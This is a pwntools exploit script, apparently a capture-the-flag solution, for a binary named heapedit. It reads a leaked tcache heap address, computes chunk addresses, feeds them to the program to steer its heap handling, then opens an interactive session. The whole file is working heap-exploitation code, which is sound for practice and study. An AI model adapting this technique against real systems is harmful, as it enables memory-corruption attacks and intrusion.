#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template heapedit
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'heapedit')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'./'
# Stripped:   No

CHUNK_COUNT = 6
CHUNK_SIZE = 0x80
METADATA_SIZE = 0x10 # x86_64 bit chunks have 16 bytes of metadata

io = start()

io.readuntil(b"tcache head (start of free list) ->")
base_addr = int(io.readline().strip().decode('latin1'), 16)
log.info(f"first chunk addr = {hex(base_addr)}")

for i in range(CHUNK_COUNT):
    chunk_addr = base_addr + ( (CHUNK_SIZE + METADATA_SIZE) * i )
    io.readuntil("address:")
    io.sendline(hex(chunk_addr).encode('latin1'))

io.interactive()
